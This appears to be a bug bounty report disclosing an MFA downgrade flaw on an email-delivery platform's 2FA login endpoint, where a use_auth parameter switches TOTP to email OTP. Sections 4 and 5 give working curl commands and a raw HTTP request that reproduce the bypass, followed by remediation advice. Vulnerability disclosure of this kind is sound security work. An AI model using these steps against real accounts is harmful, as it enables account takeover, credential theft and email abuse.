# [High] MFA Method Downgrade: TOTP Bypassed via `use_auth=email` Parameter on 2FA Endpoint

---

## 1. Summary

The `/login/2fa/` endpoint on `app-us.smtp2go.com` accepts a `use_auth` form parameter that controls which MFA method is used for the authentication challenge. When a user has TOTP (authenticator app) enabled as their primary MFA method, an attacker can submit `use_auth=email` during the 2FA step to force the server to switch the challenge from TOTP to email OTP — without the attacker possessing any valid TOTP code. The server responds by sending a one-time code to the account's registered email address and displaying an email OTP input form. An attacker who also controls the victim's email inbox (via phishing, compromised email account, or MX takeover) can complete the login, fully bypassing TOTP protection.

---

## 2. Vulnerability Details

- **Class**: MFA Bypass / Authentication Downgrade
- **Endpoint**: `POST https://app-us.smtp2go.com/login/2fa/`
- **Parameter**: `use_auth` (form field, default value: `app`)
- **Root cause**: The server trusts the client-supplied `use_auth` parameter to select the authentication challenge method. The value is not validated against the user's configured MFA preferences, allowing downgrade from TOTP to email OTP.

---

## 3. Severity

- **Rating**: High
- **CVSS v3.1**: 7.5 — AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N
  - Network-accessible, high complexity (requires email control), no auth required, high impact on confidentiality and integrity
- **Justification**: This vulnerability allows complete bypass of TOTP — a second authentication factor — by downgrading to a weaker email-based factor. An attacker who knows the victim's password and controls their email inbox gains full account access with no interaction from the victim.

---

## 4. Steps to Reproduce

**Prerequisites**: Attacker knows the victim's password (from credential stuffing, phishing, or another breach) and controls the victim's email inbox.

**Test account used**: `0xcaphe+roy@wearehackerone.com` (TOTP enabled)

1. Start a login session for the victim's account:
```bash
curl -s -c /tmp/cookies.txt \
  -X POST 'https://app.smtp2go.com/api/login/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'Origin: https://app.smtp2go.com' \
  -d 'username=VICTIM%40example.com&password=VICTIM_PASSWORD'
# Response: {"status":"OK","results":{"goto":"https://app-us.smtp2go.com/dashboard/main/?login_id=..."}}
```

2. Follow the `goto` URL to reach the 2FA challenge page. The page shows a TOTP form with `use_auth=app` (hidden field):
```bash
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt "$GOTO_URL" -o /tmp/2fa_page.html
# Page title: "SMTP2GO - Login 2FA", form contains name="use_auth" value="app"
```

3. Instead of submitting a valid TOTP code, submit `use_auth=email` with a dummy authentication code:
```bash
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST 'https://app-us.smtp2go.com/login/2fa/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'authentication_code=' \
  --data-urlencode 'requested_endpoint=myaccount_dashboard_main' \
  --data-urlencode 'requested_args={"login_id": "LOGIN_ID_FROM_STEP_1"}' \
  --data-urlencode 'use_auth=email'
```

4. **Observe**: The server responds with HTTP 200 containing:
   - `<p class="sms-verification-message">Enter the verification code sent to [email].</p>`
   - `<input name="authentication_code">` (email OTP input form)
   - `<input type="hidden" name="use_auth" value="email">` (downgraded method persisted)
   - `<form id="resend-sms">` (resend link)
   - "This code is valid for 10 minutes."
   
   **An email OTP has been sent to the victim's registered email address.**

5. Attacker reads the OTP from the victim's compromised email inbox and submits it:
```bash
curl -s -b /tmp/cookies.txt -c /tmp/cookies.txt \
  -X POST 'https://app-us.smtp2go.com/login/2fa/' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode 'authentication_code=OTP_FROM_EMAIL' \
  --data-urlencode 'requested_endpoint=myaccount_dashboard_main' \
  --data-urlencode 'requested_args={"login_id": "LOGIN_ID"}' \
  --data-urlencode 'use_auth=email'
# Expected: HTTP 302 → /dashboard/main/ (full authenticated session)
```

---

## 5. Proof of Concept

**HTTP request triggering the downgrade:**
```http
POST /login/2fa/ HTTP/1.1
Host: app-us.smtp2go.com
Content-Type: application/x-www-form-urlencoded
Origin: https://app-us.smtp2go.com
Cookie: login_id=<pending_mfa_session>; session=<session_id>

authentication_code=&requested_endpoint=myaccount_dashboard_main&requested_args=%7B%22login_id%22%3A+%22LOGIN_ID%22%7D&use_auth=email
```

**Server response confirming downgrade (key elements):**
```html
HTTP/1.1 200 OK

<p class="sms-verification-message">Enter the verification code sent to [email].<br>
  This code is valid for 10 minutes.
</p>
<input type="text" name="authentication_code" placeholder="Verification code">
<input type="hidden" name="use_auth" value="email">
<form method="post" id="resend-sms" action="/login/2fa/">
  <input type="hidden" name="resend_sms" value="true">
```

**Tested across multiple fresh login sessions** — server behavior is consistent.

**Comparison with other `use_auth` values** — only `email` triggers this behavior:
| `use_auth` value | Server response |
|---|---|
| `app` (default) | Normal TOTP challenge |
| `email` | ⚠️ Switches to email OTP, sends code to registered email |
| `backup` | "Code incorrect" (treated as wrong TOTP) |
| `sms` | "Code incorrect" |
| `recovery` | "Code incorrect" |
| `skip` | "Code incorrect" |
| `none` | "Code incorrect" |

---

## 6. Impact

An attacker who exploits this vulnerability can:
- **Bypass TOTP completely**: Downgrade from a time-based OTP (authenticator app) to an email OTP, which is weaker and susceptible to email-level attacks
- **Achieve full account takeover**: Combined with a compromised email inbox (phishing, email account breach, MX takeover), gain full authenticated access to the smtp2go account
- **Access sensitive account data**: API keys, SMTP credentials, sender domain configurations, email logs, billing information, sub-account management
- **Send email via victim's account**: smtp2go is an email delivery platform — account access allows sending email from the victim's verified domains and sender addresses (phishing, spam, business email compromise)
- **No interaction from victim required**: The attack is silent; victim only sees an unsolicited "verification code" email

---

## 7. Affected Scope

- **Endpoint**: `https://app-us.smtp2go.com/login/2fa/` (production)
- **Affected users**: All smtp2go users with TOTP (authenticator app) MFA enabled
- **No special privileges required on attacker side**: Only needs victim's password

---

## 8. Recommended Remediation

1. **Validate `use_auth` server-side against the user's configured MFA methods**: The server should only accept `use_auth=email` if email OTP has been explicitly configured as an allowed fallback for the account. If the user only has TOTP configured, reject any value other than `app`.

2. **Remove or restrict `use_auth` to non-sensitive values**: If email fallback is intended, explicitly mark which accounts have email OTP permitted as a fallback and enforce that at the server level, independent of client input.

3. **Log and alert on auth method changes**: Trigger an alert or confirmation email to the user whenever the authentication method is changed during a login attempt.

---

*Tested on: 2026-05-08 | Test account: authorized HackerOne test account*
